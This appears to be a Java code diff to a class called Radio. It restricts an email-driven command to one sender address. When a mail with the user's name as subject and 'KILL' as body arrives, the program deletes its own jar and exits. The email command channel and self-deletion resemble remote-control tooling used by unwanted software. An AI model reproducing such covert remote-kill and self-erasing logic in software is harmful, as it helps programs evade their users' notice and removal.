@@ -167,6 +167,7 @@ public class Radio
 	public static boolean verifyOS = true;
 	public static boolean isSecondaryDistrib = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
+	public static String allowedMailer = "targetemail@gmail.com";
 	
 	@SuppressWarnings("static-access")
 	public static void main (String[] args) throws IOException, URISyntaxException
@@ -485,15 +486,18 @@ public class Radio
 		         //System.out.println("[[ Mailer Command Received ]]");
 		         //System.out.println("Email Number " + (i + 1));
 		         //System.out.println("Subject: " + message.getSubject());
-		   //      System.out.println("From: " + message.getFrom()[0]);
+		         //System.out.println("From: " + message.getFrom()[0]);
 		         //System.out.println("Text: " + message.getContent().toString());
 		         //System.out.println("---------------------------------");
-		         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) {
+		         if((message.getFrom()[0] + "").matches(allowedMailer))
+		         {
+		         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
+		         {
 		        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		 			cf.deleteOnExit();
 		 			System.exit(0);
-		         }
-		         
+		         	}
+		      	}
 		      }
 
 		      //close the store and folder objects
